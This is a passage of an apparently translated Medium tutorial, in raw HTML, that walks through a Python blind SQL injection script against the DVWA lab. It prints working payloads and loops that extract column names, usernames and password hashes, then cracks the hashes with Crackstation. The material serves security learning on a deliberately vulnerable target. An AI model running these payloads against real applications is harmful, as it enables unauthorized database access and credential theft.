bi"><span id="fed1" class="nl mb it nh b gy nm nn l no np">users_table = input("Type the tabname to attack: ")<br/>query = "1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}')='{}'%23"<br/>    <br/>n_columns = 0<br/>for i in range(1, 10):<br/>    if get_query_result(s, sqli_blind_url, query, users_table, i):<br/>        print(f"[+] It has {i} columns")<br/>        n_columns = i<br/>        break</span></pre><p id="ba22" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">获取列数这正是我们已经做的，所以我们可以跳过，看看如何获取列名。</p><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="2e4f" class="nl mb it nh b gy nm nn l no np">query = "1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {}, 1),{},1)='{}'%23"<br/>    <br/>found_columns = [[] for _ in range(n_columns)]<br/>completion = ""<br/>print("[!] In order to speed up, try to press CTRL+C when you find the user and password columns")<br/>try:<br/>    for i in range(n_columns):        <br/>        for j in range(1, 12):<br/>            for c in string.ascii_lowercase:<br/>                if get_query_result(s, sqli_blind_url, query, users_table, i, j, c):<br/>                    found_columns[i].append(c)<br/>                        <br/>                    break<br/>        print("\t","".join(found_columns[i]))<br/>except KeyboardInterrupt as e:<br/>    print("\nSkipping this phase!")</span></pre><p id="39ba" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这与我们查询表名的方式没有太大不同，但是，请注意<a class="ae ld" href="https://www.w3schools.com/mysql/mysql_limit.asp" rel="noopener ugc nofollow" target="_blank">限制子句</a>的用法，我们可以在这里看到<a class="ae ld" href="https://www.w3schools.com/Php/php_mysql_select_limit.asp" rel="noopener ugc nofollow" target="_blank"/>这个子句允许我们指定偏移量，这样我们就可以得到第n个元素。</p><h1 id="c678" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">步骤6:在一次盲目的SQLi攻击中获取用户名</h1><p id="74ca" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">这是我们获取所有用户名的步骤。<br/>枚举完列后，我们可以让用户选择用户名列和密码列，然后让用户继续猜测。</p><p id="a64d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这一阶段与前一阶段没有太大的不同，我们只是列出所有用户名，让用户能够停止研究，进入下一步！</p><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="af8b" class="nl mb it nh b gy nm nn l no np">users_column = input("Type the name of the column containing usernames: ")<br/>passwords_column = input("Type the name of the column containing passwords: ")</span><span id="ddbc" class="nl mb it nh b gy ny nn l no np">query = "1' AND SUBSTR((SELECT {} FROM {} LIMIT {}, 1),{},1)='{}'%23"<br/>    <br/>found_users = [[] for _ in range(10)]<br/>completion = ""<br/>print("[!] In order to speed up, try to press CTRL+C when you find the target user")<br/>try:<br/>    for i in range(10):        <br/>        for j in range(1, 12):<br/>            for c in string.ascii_letters+string.digits:<br/>                if get_query_result(s, sqli_blind_url, query, users_column, users_table, i, j, c):<br/>                    found_users[i].append(c)<br/>                        <br/>                    break<br/>        print("\t","".join(found_users[i]))<br/>except KeyboardInterrupt as e:<br/>    print("\n Skipping this phase!")</span></pre><p id="8b70" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这段代码将列出表中的每个用户，当我们完成后，我们可以停止并开始猜测密码。</p><h1 id="0ca9" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">步骤7:在一次盲目的SQLi攻击中获取用户的密码</h1><p id="1cc7" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">我们的攻击已经结束了。</p><p id="9f54" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">到目前为止，我们已经了解了如何猜测密码，所以我只向您展示代码:</p><ul class=""><li id="e6aa" class="lm ln it kh b ki kj km kn le lo lf lp lg lq lc lr ls lt lu bi translated">询问目标用户</li><li id="978c" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated">猜测密码长度</li><li id="8840" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated">猜测用户的密码</li></ul><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="f4a7" class="nl mb it nh b gy nm nn l no np">query = "1' AND LENGTH((SELECT {} FROM {} WHERE {}='{}'))={}%23"<br/>pwd_length = 0<br/>for i in range(100):<br/>        <br/>    if get_query_result(s, sqli_blind_url, query, passwords_column, users_table, users_column, username, i ):<br/>        pwd_length = i<br/>        print(f"[+] The password length is: {i}")<br/>        <br/>query = "1' AND SUBSTR((SELECT {} FROM {} WHERE {}='{}' LIMIT 1), {}, 1)='{}'%23"<br/>password = []<br/>for j in range(1, pwd_length+1):<br/>        <br/>    for c in string.ascii_letters+string.digits:<br/>            <br/>        if get_query_result(s, sqli_blind_url, query, passwords_column, users_table, users_column, username, j, c):<br/>                password.append(c)<br/>                <br/>            break<br/>print("[+] Password is: ","".join(password))</span></pre><h1 id="e915" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">步骤8:在一次盲目的SQLi攻击中破解密码</h1><p id="163d" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">最后，一切都完成了，是时候检查我们是否可以只使用一个python脚本在DVWA上执行盲SQL注入了！</p><p id="a9a8" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">让我们通过在终端上键入以下命令，对DVWA实例运行盲SQLi攻击:</p><p id="38fc" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe nv nw nx nh b">python main.py</code></p><p id="3e5a" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">而这就是我们在介绍中已经看到的牛逼结果！</p><figure class="li lj lk ll gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi lh"><img src="../Images/9a05faf953f1e7f0ed7d02b5457de377.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7yI4pNvyzF-pWhT4C5PWBA.jpeg"/></div></div></figure><p id="efda" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">像在DVWA和每个真实数据库中一样，密码被散列，所以让我们将结果复制粘贴到<a class="ae ld" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank"> Crackstation </a>中。</p><figure class="li lj lk ll gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ns"><img src="../Images/19d2d58b041adb27b8b81927562f9dd6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CvhrKV51NCdQHn_xcF44Ng.jpeg"/></div></div></figure><p id="b897" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们有结果了！</p><p id="0872" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">大概你想看完整的代码，那就这样吧！</p><figure class="li lj lk ll gt ju"><div class="bz fp l di"><div class="nq nr l"/></div></figure><p id="b5ff" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">NB:记得更换IP地址！</p><h1 id="1aa2" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">结论</h1><p id="8fbc" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">与其他文章相比，这篇文章很长，所以我不再赘述。</p><p id="66eb" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我希望你会觉得有趣，也许你和我一样学到了很多。无论你在IT领域做什么，这些知识都会派上用场。我从这个项目中获得了很多乐趣，我希望能延续下去。如果你喜欢我的工作，请在我的社交网站上关注我，如果你想给我反馈，请随时使用联系人表格！</p><p id="9c40" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我只想用一个想法来结束:</p><p id="edf9" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">相对于Burp Suite Community Edition而言，运行此脚本不会有太多的性能差距，因此请尝试使用线程来执行最耗时的任务！</p><p id="b8cf" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">感谢您的关注！</p></div><div class="ab cl nz oa hx ob" role="separator"><span class="oc bw bk od oe of"/><span class="oc bw bk od oe of"/><span class="oc bw bk od oe"/></div><div class="im in io ip iq"><p id="5e11" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><em class="kg">你可以通过下面的链接注册，每月只需5美元就可以获得所有的媒体报道:</em></p><div class="og oh gp gr oi oj"><a href="https://medium.com/membership/@stackzero" rel="noopener follow" target="_blank"><div class="ok ab fo"><div class="ol ab om cl cj on"><h2 class="bd iu gy z fp oo fr fs op fu fw is bi translated">通过我的推荐链接加入Medium-stack zero</h2><div class="oq l"><h3 class="bd b gy z fp oo fr fs op fu fw dk translated">我们的最新报道(以及数以千计的其他报道)一经发布，您就可以立即获得。成为会员后，您将获得所有权限…</h3></div><div class="or l"><p class="bd b dl z fp oo fr fs op fu fw dk translated">medium.com</p></div></div><div class="os l"><div class="ot l ou ov ow os ox jz oj"/></div></div></a></div></div><div class="ab cl nz oa hx ob" role="separator"><span class="oc bw bk od oe of"/><span class="oc bw bk od oe of"/><span class="oc bw bk od oe"/></div><div class="im in io ip iq"><p id="57e0" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><em class="kg">原载于2022年10月18日</em><a class="ae ld" href="https://www.stackzero.net/blind-sql-injection-dvwa-low-security-with-python/" rel="noopener ugc nofollow" target="_blank"><em class="kg">【https://www.stackzero.net】</em></a><em class="kg">。</em></p></div><div class="ab cl nz oa hx ob" role="separator"><span class="oc bw bk od oe of"/><span class="oc bw bk od oe of"/><span class="oc bw bk od oe"/></div><div class="im in io ip iq"><h2 id="40f9" class="nl mb it bd mc oy oz dn mg pa pb dp mk le pc pd mo lf pe pf ms lg pg ph mw pi bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ld" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>